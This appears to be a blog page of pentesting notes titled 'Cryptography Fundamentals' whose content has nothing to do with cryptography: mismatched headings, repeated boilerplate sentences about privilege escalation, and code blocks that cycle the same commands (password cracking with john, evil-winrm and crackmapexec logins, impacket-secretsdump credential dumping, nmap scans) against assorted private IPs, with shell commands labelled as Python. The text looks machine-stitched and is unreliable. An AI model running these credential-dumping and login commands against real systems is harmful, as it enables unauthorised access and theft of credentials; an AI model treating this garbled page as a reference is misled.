---
TitleSEO: "Cryptography Fundamentals | ZureFX"
TitlePost: "Cryptography Fundamentals"
Author: "ZureFX"
Description: "Personal notes on Cryptography Fundamentals. Quick reference for pentesting and CTF challenges."
Keywords: "persistence, dfir, blue team, linux"
URL: "https://zurefx.github.io/notes/note-cryptography-fundamentals-791.html"
URL_IMAGES: ""
Date: "2025-08-15"
Tags: "Persistence, DFIR, Blue Team, Linux"
Section: "notes"
Lang: "en"
main_img: "note-cryptography-fundamentals-791"
Permalink: "/notes/note-cryptography-fundamentals-791.html"
BtnLabel: "Read Notes"
Pick: 0
---
## Java

### CORS Misconfiguration

The service was running without proper input validation, leading to injection vulnerabilities. Token impersonation allowed elevation to SYSTEM privileges on the target. The scheduled task ran with elevated privileges and could be abused for escalation. Weak file permissions allowed modification of critical system files. The database credentials were hardcoded in the application source code.

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
evil-winrm -i 10.90.64.145 -u administrator -p 'P@ssw0rd!'
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
crackmapexec smb 10.50.175.203 -u administrator -p 'P@ssw0rd!' --shares
```

- `CORS Misconfiguration`
- `pwncat`
- `Command Injection`
- `ldapsearch`
- `DCSync`
- `Weak Service Permissions`

```bash
impacket-secretsdump administrator:'P@ssw0rd!'@10.64.252.173
```

## nmap

### PowerShell

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
nmap -sCV -p135,110,636 10.99.225.166 -oN scan.txt
feroxbuster -h
impacket-secretsdump administrator:'P@ssw0rd!'@10.103.87.24
```

```bash
feroxbuster -h
impacket-secretsdump administrator:'P@ssw0rd!'@10.77.3.79
nmap -sCV -p143,443,8888 10.89.55.22 -oN scan.txt
```

Token impersonation allowed elevation to SYSTEM privileges on the target. The database credentials were hardcoded in the application source code.

The web application was vulnerable to Server-Side Template Injection (SSTI). The service account had excessive permissions assigned in Active Directory. The kernel version was outdated and vulnerable to a publicly known exploit. Unconstrained delegation was enabled on the compromised machine. Privilege escalation was possible due to misconfigured sudo permissions.

Post-exploitation enumeration revealed a path to domain administrator privileges. Token impersonation allowed elevation to SYSTEM privileges on the target.

## SQL Injection

### feroxbuster

```powershell
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
feroxbuster -h
impacket-secretsdump administrator:'P@ssw0rd!'@10.20.23.136
```

```python
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
impacket-secretsdump administrator:'P@ssw0rd!'@10.16.51.121
nmap -sCV -p9200,993,53 10.44.230.221 -oN scan.txt
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```
